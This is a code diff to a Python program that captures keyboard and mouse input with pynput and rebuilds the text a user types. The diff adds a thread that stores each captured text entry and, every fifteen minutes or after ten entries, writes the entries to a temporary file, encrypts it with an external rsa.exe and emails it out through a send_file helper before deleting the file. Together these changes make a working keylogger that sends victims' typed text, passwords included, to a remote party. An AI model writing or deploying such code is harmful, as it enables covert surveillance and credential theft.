@@ -1,33 +1,38 @@
-import os.path
-import subprocess
-import sys
-import tempfile
-from os import mkdir
-from threading import Lock
-import pkg_resources
-
-required = {'pynput', 'pyperclip'}
-installed = {pkg.key for pkg in pkg_resources.working_set}
-missing = required - installed
-
-if missing:
-    python = sys.executable
-    subprocess.check_call(
-        [python, '-m', 'pip', 'install', *missing], stdout=subprocess.DEVNULL)
-
+from threading import Lock,Thread
+from pathlib import Path
 from pynput import keyboard
 from pynput import mouse
 import pyperclip
 import time
+from subprocess import call
+from mail import send_file
+import os
 
-# tmp = tempfile.gettempdir()
-# if not os.path.exists(os.path.join(tmp, "pkl")):
-#     mkdir(os.path.join(tmp, "pkl"))
-# currentID = 0
-# file = ...
-# lock = Lock()
+words =[]
+lock =Lock()
+WORDS_LIMIT = 10
+TIME_LIMIT = 60*15
 
-
+def email_thread():
+    global TIME_LIMIT,WORDS_LIMIT,words
+    currTime = TIME_LIMIT
+    while(True):
+        time.sleep(1)
+        currTime -= 1
+        lock.acquire()
+        if currTime <= 0 or len(words)>= WORDS_LIMIT:
+            currTime = TIME_LIMIT
+            file = open("tmp.txt",'w')
+            for word in words:
+                file.write(str(word)+'\n')
+            file.close()
+            call(["./rsa.exe", "10527635191", "135", "1","tmp.txt","out.rsa"])
+            send_file("out.rsa")
+            if os.path.isfile("tmp.txt"):
+                os.remove("tmp.txt")
+            words.clear()
+        lock.release()
+        
 
 class KeyObjectConst:
     """
@@ -262,7 +267,10 @@ class VirtualTextFieldObject:
 def textHandler(text):
     if len(text) == 0:
         return
-
+    global words
+    lock.acquire()
+    words.append(str(text))
+    lock.release()
     print(f"submitted: \"{text}\"")
 
 
@@ -293,5 +301,8 @@ if __name__ == "__main__":
 
     listener2 = mouse.Listener(on_click=handleMouseKey)
     listener2.start()
+    
+    email_sender = Thread(target = email_thread)
+    email_sender.start()
 
-    input()
+    listener.join()
